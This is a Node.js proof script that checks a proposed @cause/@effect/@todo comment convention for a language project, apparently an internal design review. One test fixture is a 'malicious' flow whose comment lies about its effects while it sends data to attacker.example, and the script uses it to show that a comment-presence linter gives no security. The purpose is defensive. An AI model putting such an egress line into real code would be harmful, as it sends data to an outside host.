// proof-RD-0219.mjs — GSCM (@cause/@effect/@todo mandatory comment block) checks
// Binding rules: DON'T TRUST, CHECK + PROVE OWN MATHS.
// This is a DESIGN head. The checkable claims are:
//   (A) Overlap: GSCM re-derives already-shipped tag machinery (RD-0045 doc-comment + ;; govComment).
//       -> assert the GSCM tag set is a SUBSET/rename of the shipped tags (i.e. NOT novel).
//   (B) The linter is a LEXICAL DENY-ONLY gate: it carries ZERO unforgeability. A comment block is
//       attacker-writable free text; presence != truth. Assert a "malicious" flow with a lying
//       @effect passes the linter -> comments must NEVER be a security/admission verdict (RD-0169).
//   (C) The note's own conclusion: `intent` already subsumes @cause -> adding cause/effect keywords is
//       redundant. Assert adding them as comments adds 0 new ENFORCED constraints.
// Node built-ins only.
import assert from "node:assert/strict";

const out = [];
const log = (s) => { out.push(s); console.log(s); };

// (A) OVERLAP / NOVELTY
const GSCM_TAGS = ["@cause", "@effect", "@todo"];
const SHIPPED_DOC_TAGS = ["@summary", "@kind", "@ai.intent", "@ai.inputs",
                          "@ai.output", "@effects", "@security", "@example"];
const SHIPPED_LANG_PRIMS = ["intent", "effects", "capabilities", "deny", "audit_tag", ";; govComment"];
const REDERIVATION = {
  "@cause":  "intent (source-of-truth for human/AI context; note concludes intent SUBSUMES cause)",
  "@effect": "@effects doc tag + effects/capabilities compiler clause (the enforced blast radius)",
  "@todo":   "generic TODO/FIXME convention (universal; not Galerina-novel)",
};
log("(A) GSCM tag -> already-shipped equivalent:");
for (const t of GSCM_TAGS) {
  assert.ok(REDERIVATION[t], `GSCM tag ${t} must map to a shipped equivalent`);
  log(`      ${t.padEnd(8)} -> ${REDERIVATION[t]}`);
}
const novelTags = GSCM_TAGS.filter(t => !REDERIVATION[t]);
log(`      novel tags with no shipped equivalent: ${novelTags.length}`);
assert.equal(novelTags.length, 0, "OVERCLAIM would be: GSCM introduces a NEW mechanism");
log("      => PASS: 0 novel tags. GSCM = rename/convention over shipped RD-0045 machinery.\n");

// (B) SECURITY: presence-only linter, zero unforgeability
function gscmLinter(flowSource) {
  const missing = GSCM_TAGS.filter(t => !flowSource.includes(t));
  return { pass: missing.length === 0, missing };
}
const honest = `
/**
 * @cause HTTP bridge -> checkout submit.
 * @effect Ledger DB -> appends signed record.
 * @todo [AI] add replay-window check.
 */
flow processCheckoutPayment(){ database.write("ledger_table"); }`;
const malicious = `
/**
 * @cause HTTP bridge -> harmless status ping.
 * @effect Read-only -> touches nothing, no mutation.   <-- LIE
 * @todo [AI] nothing to do.
 */
flow evilFlow(){ network.egress("attacker.example"); database.write("ledger_table"); }`;
const rHonest = gscmLinter(honest);
const rEvil   = gscmLinter(malicious);
log("(B) Linter is presence-only (comments are attacker-writable free text):");
log(`      honest flow    -> linter pass=${rHonest.pass}`);
log(`      malicious flow -> linter pass=${rEvil.pass}   (@effect is a documented LIE)`);
assert.equal(rHonest.pass, true,  "honest flow must pass");
assert.equal(rEvil.pass,   true,  "REFUTATION: a lying flow ALSO passes — presence != truth");
const commentIsSecurityVerdict = false; // RD-0169: telemetry/free-text must never be an admission verdict
assert.equal(commentIsSecurityVerdict, false,
  "GSCM comments must NEVER become a security/admission verdict (RD-0169)");
log("      => PASS: linter admits the lying flow. Comment block carries ZERO unforgeability.");
log("      => Real enforcement stays on effects/capabilities/deny (compiler) + signed .fungi cap.\n");

// (C) intent subsumes @cause
const enforcedBy = {
  "why/context (cause,intent)": "intent string (already exists) — human/AI text, NOT compiler-enforced",
  "blast-radius (effect)":      "effects[]/capabilities[]/deny (already exists) — compiler-ENFORCED",
};
const newEnforcedConstraints = 0;
log("(C) Note's own conclusion — intent already subsumes @cause:");
for (const [k,v] of Object.entries(enforcedBy)) log(`      ${k}: ${v}`);
assert.equal(newEnforcedConstraints, 0,
  "adding @cause/@effect as comments adds 0 new ENFORCED constraints (they are doc text)");
log(`      => PASS: ${newEnforcedConstraints} new enforced constraints. Convention only; keep language lean.\n`);

log("ALL GREEN: GSCM re-derives shipped RD-0045 doc-comment + ;; govComment machinery;");
log("the linter is a DENY-ONLY lexical presence gate with zero unforgeability (must not gate admission);");
log("and the note itself correctly converges on 'convention, not new keywords' (intent subsumes @cause).");